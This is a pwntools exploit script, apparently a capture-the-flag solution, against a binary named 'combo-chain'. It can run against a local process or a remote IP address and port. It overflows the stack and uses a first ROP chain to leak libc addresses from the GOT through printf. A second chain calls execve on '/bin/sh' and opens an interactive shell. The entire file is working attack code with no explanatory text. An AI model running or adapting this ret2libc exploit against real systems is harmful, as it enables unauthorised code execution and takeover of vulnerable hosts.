#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template combo-chain
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('combo-chain')
context.terminal = ['gnome-terminal', '-e']
libc = ELF('/usr/lib/libc.so.6')

if args.REMOTE:
    libc = ELF('libc6_2.19-0ubuntu6.15_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8197, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

#input("ASDF")

rip_offset=16


#attack        
log.info("Base Address: 0x%x"%exe.address)

r=ROP(exe)
r.call(exe.sym.printf,[exe.sym.got.printf,0])
r.call(exe.sym.printf,[exe.sym.got.getegid,0])
r.main()

ropd=8

payload=dict()

payload[rip_offset] = r.chain()

io.recvuntil("CARNAGE!: ")
io.sendline(fit(payload))

libc_printf = u64(io.recvuntil(b'\x7f').ljust(8, b"\x00"))
libc.address = libc_printf - libc.sym.printf

libc_getegid = u64(io.recvuntil(b'\x7f').ljust(8, b"\x00"))

log.success("Libc: 0x%x"%libc.address)
log.success("Libc printf: 0x%x"%libc_printf)
log.success("Libc getegid: 0x%x"%libc_getegid)

payload=dict()

r=ROP(libc)
r.call(libc.sym.execve,[next(libc.search(b"/bin/sh")),0,0])

payload[rip_offset]=r.chain()

io.recvuntil("CARNAGE!: ")
io.sendline(fit(payload))

io.interactive(prompt=term.text.bold_red('pwn$')+' ')

